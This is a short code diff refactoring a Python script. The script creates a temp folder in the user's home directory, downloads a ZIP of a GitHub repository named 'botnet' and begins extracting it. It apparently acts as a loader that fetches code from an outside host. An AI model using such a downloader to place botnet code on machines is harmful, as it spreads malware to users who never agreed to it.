@@ -12,11 +12,10 @@ working_dir = home_dir / "temp_folder"
 github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 
 
 def main():
-    # Create the working directory if it doesn't exist
-    os.makedirs(working_dir, exist_ok=True)
-    zip_filepath = os.path.join(working_dir, "repo_download.zip")
+    zip_filepath = working_dir / "repo_download.zip"
+    working_dir.mkdir(parents=True, exist_ok=True)
 
-    urllib.request.urlretrieve(github_zip_url, zip_filepath)
+    urllib.request.urlretrieve(github_zip_url, str(zip_filepath))
     
     print("Extracting ZIP...")
     with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
